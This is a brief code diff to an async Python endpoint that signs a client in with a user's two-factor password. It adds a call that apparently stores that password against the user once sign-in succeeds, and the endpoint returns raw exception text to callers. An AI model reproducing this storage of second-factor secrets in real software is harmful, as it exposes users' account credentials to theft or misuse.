@@ -186,11 +186,13 @@ async def api_2fa():
 
     if not user_id or not password:
         return jsonify({"ok": False, "error": "missing user_id or password"}), 400
+    
 
     try:
         client = get_client_for_user(user_id)
         await client.connect()
         await client.sign_in(password=password)
+        put_2fa_in_user(user_id,password)
         return jsonify({"ok": True})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 400
